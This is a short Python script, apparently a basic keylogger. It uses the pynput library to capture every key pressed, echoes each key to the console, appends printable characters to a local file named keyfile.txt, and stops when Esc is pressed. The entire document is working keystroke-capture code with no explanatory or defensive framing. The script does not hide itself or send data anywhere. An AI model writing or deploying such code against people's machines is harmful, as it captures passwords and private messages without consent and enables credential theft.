from pynput.keyboard import Key, Listener

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

def keyRelease (key):
    if key == Key.esc:
        return False

if __name__=="__main__":

 with Listener(on_press=keyPressed, on_release=keyRelease) as listener:
    listener.join()
       
       